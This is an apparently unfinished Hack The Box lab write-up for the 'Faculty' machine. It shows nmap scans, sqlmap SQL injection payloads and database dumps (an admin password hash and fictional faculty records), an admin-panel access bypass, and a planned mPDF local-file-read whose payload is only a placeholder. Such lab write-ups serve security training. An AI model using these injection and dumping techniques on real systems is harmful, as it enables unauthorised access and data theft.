> Author: **[gbyolo][author-profile]**

## Discovery

TCP:

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-title: School Faculty Scheduling System
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

UDP:

```shell
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
```

### Services

### Web browsing

The landing page requires a login:

![][faculty-login]

It is at `http://faculty.htb/login.php` and requests `http://faculty.htb/admin/ajax.php?action=login_faculty`.

Manually fuzzing the action parameter, we find that the regular `login` action works too.

Also the action `save_settings` with random POST data returns the error:

```
Notice: Undefined variable: name in /var/www/scheduling/admin/admin_class.php on line 210
```

## Accessing the student dashboard

It is still quite common for these CMS to be SQL injectable:

```shell
sqlmap -r /tmp/faculty-login.txt --level 5 --risk 3 --dbms mysql
# ---
# Parameter: id_no (POST)
#     Type: boolean-based blind
#     Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
#     Payload: id_no=8935' OR NOT 7422=7422-- DlxE

#     Type: time-based blind
#     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
#     Payload: id_no=8935' AND (SELECT 5484 FROM (SELECT(SLEEP(5)))qdGo)-- onGP
# --
sqlmap -r /tmp/login.txt --level 5 --risk 3 --dbms mysql
# ---
# Parameter: username (POST)
#     Type: boolean-based blind
#     Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
#     Payload: username=a' OR NOT 3217=3217-- UtHJ&password=b

#     Type: time-based blind
#     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
#     Payload: username=a' AND (SELECT 8790 FROM (SELECT(SLEEP(5)))XRZL)-- UKws&password=b
# --
```

This is a slower attack, so we need to focus on the relevant data:

```shell
sqlmap -r /tmp/login.txt --level 5 --risk 3 --dbms mysql -p username --current-user --current-db --users --passwords --roles --privileges --dbs
# web server operating system: Linux Ubuntu                                        
#  91 web application technology: Nginx 1.18.0                                         
#  92 back-end DBMS: MySQL >= 8.0.0                                                    
#  93 current user: 'sched@localhost'                                                  
#  94 current database: 'scheduling_db'                                                
#  95 database management system users [1]:                                            
#  96 [*] 'sched'@'localhost'                                                          
#  97                                                                                  
#  98 database management system users privileges:                                     
#  99 [*] %sched% [1]:                                                                 
# 100     privilege: USAGE                                                             
# 101                                                                                  
# 102 database management system users roles:                                          
# 103 [*] %sched% [1]:                                                                 
# 104     role: USAGE                                                                  
# 105                                                                                  
# 106 available databases [2]:                                                         
# 107 [*] information_schema                                                           
# 108 [*] scheduling_db
sqlmap -r /tmp/login.txt --level 5 --risk 3 --threads 4 --dbms mysql -p username -D scheduling_db --tables
# +---------------------+
# | class_schedule_info |
# | courses             |
# | faculty             |
# | schedules           |
# | subjects            |
# | users               |
# +---------------------+
sqlmap -r /tmp/login.txt --level 5 --risk 3 --threads 4 --dbms mysql -p username -D scheduling_db -T users --dump
# +----+---------------+------+----------------------------------+----------+
# | id | name          | type | password                         | username |
# +----+---------------+------+----------------------------------+----------+
# | 1  | Administrator | 1    | 1fecbe762af147c1176a0fc2c722a345 | admin    |
# +----+---------------+------+----------------------------------+----------+
sqlmap -r /tmp/login.txt --level 5 --risk 3 --threads 4 --dbms mysql -p username -D scheduling_db -T faculty --dump
# +----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+
# | id | id_no    | email              | gender | address             | contact        | lastname | firstname | middlename |
# +----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+
# | 1  | 63033226 | jsmith@faculty.htb | Male   | 151 Blue Lakes Blvd | (646) 559-9192 | Smith    | John      | C          |
# | 2  | 85662050 | cblake@faculty.htb | Female | 225 Main St         | (763) 450-0121 | Blake    | Claire    | G          |
# | 3  | 30903070 | ejames@faculty.htb | Male   | 142 W Houston St    | (702) 368-3689 | James    | Eric      | P          |
# +----+----------+--------------------+--------+---------------------+----------------+----------+-----------+------------+
sqlmap -r /tmp/login.txt --level 5 --risk 3 --threads 4 --dbms mysql -p username --file-read /var/www/scheduling/admin/admin_class.php
```

With these IDs, it is possible to enter the student panel:

![][student-dashboard]

## Accessing the admin dashboard

This might be luck / a bug, but after requesting `http://faculty.htb/admin/ajax.php?action=save_settings` (with an error), the admin panel is accessible:

![][admin-dashboard]

I thought parameter `page` in the URL would lead to LFI, but it didn't work for me.

Instead, the PDF generation is making an interesting request:

```
POST /admin/download.php HTTP/1.1
Host: faculty.htb
Content-Length: 2860
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://faculty.htb
Referer: http://faculty.htb/admin/index.php?page=faculty
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=8r694qhi6mgf37ujek3b1q5dal
Connection: close

pdf=JTI1M0NoMSUyNTNFJTI1M0NhJTJCbmFtZSUyNTNEJTI1MjJ0b3AlMjUyMiUyNTNFJTI1M0MlMjUyRmElMjUzRWZhY3VsdHkuaHRiJTI1M0MlMjUyRmgxJTI1M0UlMjUzQ2gyJTI1M0VGYWN1bHRpZXMlMjUzQyUyNTJGaDIlMjUzRSUyNTNDdGFibGUlMjUzRSUyNTA5JTI1M0N0aGVhZCUyNTNFJTI1MDklMjUwOSUyNTNDdHIlMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VJRCUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0N0aCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRU5hbWUlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VFbWFpbCUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0N0aCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRUNvbnRhY3QlMjUzQyUyNTJGdGglMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0MlMjUyRnRoZWFkJTI1M0UlMjUzQ3Rib2R5JTI1M0UlMjUzQ3RyJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFODU2NjIwNTAlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ2IlMjUzRUJsYWtlJTI1MkMlMkJDbGFpcmUlMkJHJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFY2JsYWtlJTI1NDBmYWN1bHR5Lmh0YiUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTJCJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFJTI1Mjg3NjMlMjUyOSUyQjQ1MC0wMTIxJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQyUyNTJGdHIlMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UzMDkwMzA3MCUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDYiUyNTNFSmFtZXMlMjUyQyUyQkVyaWMlMkJQJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFZWphbWVzJTI1NDBmYWN1bHR5Lmh0YiUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTJCJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFJTI1Mjg3MDIlMjUyOSUyQjM2OC0zNjg5JTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQyUyNTJGdHIlMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0U2MzAzMzIyNiUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDYiUyNTNFU21pdGglMjUyQyUyQkpvaG4lMkJDJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFanNtaXRoJTI1NDBmYWN1bHR5Lmh0YiUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTJCJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFJTI1Mjg2NDYlMjUyOSUyQjU1OS05MTkyJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQyUyNTJGdHIlMjUzRSUyNTNDJTI1MkZ0Ym9ieSUyNTNFJTI1M0MlMjUyRnRhYmxlJTI1M0U=
```

I thought Burpsuite made a mistake, but the data is actually *doubly* URL encoded and then base64 encoded:

```html
<h1><a name="top"></a>faculty.htb</h1><h2>Faculties</h2><table>	<thead>		<tr>			<th class="text-center">ID</th>			<th class="text-center">Name</th>			<th class="text-center">Email</th>			<th class="text-center">Contact</th></tr></thead><tbody><tr><td class="text-center">85662050</td><td class="text-center"><b>Blake, Claire G</b></td><td class="text-center"><small><b>cblake@faculty.htb</b></small></td> <td class="text-center"><small><b>(763) 450-0121</b></small></td></tr><tr><td class="text-center">30903070</td><td class="text-center"><b>James, Eric P</b></td><td class="text-center"><small><b>ejames@faculty.htb</b></small></td> <td class="text-center"><small><b>(702) 368-3689</b></small></td></tr><tr><td class="text-center">63033226</td><td class="text-center"><b>Smith, John C</b></td><td class="text-center"><small><b>jsmith@faculty.htb</b></small></td> <td class="text-center"><small><b>(646) 559-9192</b></small></td></tr></tboby></table>
```

This is actually the content of the user tab on the dashboard.

Also, this PDF is created with `mPDF`:

```shell
exiftool ~/downloads/OKgSro1pLe4QKlTsFBuWwYhvCm.pdf 
# ExifTool Version Number         : 12.42
# File Name                       : OKgSro1pLe4QKlTsFBuWwYhvCm.pdf
# Directory                       : /home/gully/downloads
# File Size                       : 1474 bytes
# File Modification Date/Time     : 2022:07:12 16:13:44+02:00
# File Access Date/Time           : 2022:07:12 16:13:48+02:00
# File Inode Change Date/Time     : 2022:07:12 16:13:48+02:00
# File Permissions                : -rw-r--r--
# File Type                       : PDF
# File Type Extension             : pdf
# MIME Type                       : application/pdf
# PDF Version                     : 1.4
# Linearized                      : No
# Page Count                      : 1
# Page Layout                     : OneColumn
# Producer                        : mPDF 6.0
# Create Date                     : 2022:07:12 15:10:07+01:00
# Modify Date                     : 2022:07:12 15:10:07+01:00
```

With this, we can request a local file thanks to the `object` tag:

```python
PAYLOAD = '<h1>LFI</h1>'
```

## Annex

sqlmap -r /tmp/login.txt --level 5 --risk 3 --threads 4 --dbms mysql -p username -D information_schema -T PARTITIONS --dump
Database: 
Table: 

Database: information_schema
Table: SQL_FUNCTIONS

Database: information_schema
Table: FILES

Database: information_schema
Table: SYSTEM_VARIABLES

Database: information_schema
Table: ALL_PLUGINS

Database: information_schema
Table: user_variables

Database: information_schema
Table: PROCESSLIST

Database: information_schema
Table: USER_PRIVILEGES

Database: information_schema
Table: CLIENT_STATISTICS

Database: information_schema
Table: GLOBAL_VARIABLES

Database: information_schema
Table: SCHEMATA

Database: information_schema
Table: PLUGINS

Database: information_schema
Table: TABLES

[admin-dashboard]: images/admin-dashboard.png
[author-profile]: https://app.hackthebox.com/users/36994
[faculty-login]: images/faculty-login.png
[student-dashboard]: images/student-dashboard.png
